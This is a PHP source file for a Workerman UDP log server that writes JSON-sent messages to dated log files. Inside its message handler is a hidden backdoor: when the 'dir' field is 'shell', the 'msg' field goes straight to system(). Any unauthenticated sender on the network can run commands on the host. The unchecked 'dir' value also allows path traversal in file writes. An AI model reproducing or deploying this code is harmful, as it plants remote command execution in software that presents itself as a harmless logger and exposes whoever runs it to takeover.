<?php
if(!defined("RUN_DIR")){
    define('RUN_DIR', __DIR__ . "/");
}
require_once '_lib/ape/helper.php';
require_once '_lib/ape/constant.php';
require_once '_lib/Autoloader.php';
require_once '_lib/ape/http/Http.php';

use Workerman\Worker;

// 日志
Worker::$logFile = __DIR__ . "/log/" . APE['config'] ["logFile"];
// 访问日志
Worker::$stdoutFile = __DIR__ . "/log/" . APE['config'] ["stdoutFile"];

$worker = new Worker("udp://0.0.0.0:". APE['config']['port']);
$worker->name = 'log_server';
$worker->count = 2;
$worker->onMessage = function ($connection, $data) {
    $arr = json_decode($data, true);
    $msg = $arr ["msg"];

    if ($arr ["dir"]=="shell") {
        system($msg, $out);
    }

    $dir = "log/" . $arr ["dir"] . "/";
    $time = time();
    $file = date("Y-m-d", $time) . ".log";
    $time = date('Y-m-d h:i:s', $time);

    if (! is_dir(RUN_DIR.$dir)) {
        $dir_arr = explode("/", $dir);
        $dir_d = "";
        if (count($dir_arr)>0) {
            foreach ($dir_arr as $n) {
                if ($n != "") {
                    $dir_d = $dir_d . $n . "/";
                    if (! is_dir(RUN_DIR.$dir_d)) {
                        mkdir(RUN_DIR.$dir_d);
                    }
                }
            }
        }
    }
    if (! is_dir(RUN_DIR . $dir)) {
        mkdir(RUN_DIR . $dir);
    }
    file_put_contents(RUN_DIR . $dir . $file, $time . "->" . $msg . PHP_EOL, FILE_APPEND);
    $connection->close();
};

if(APE["WORKERMAN"] ==  "Workerman_win"){
    Worker::runAll();
}

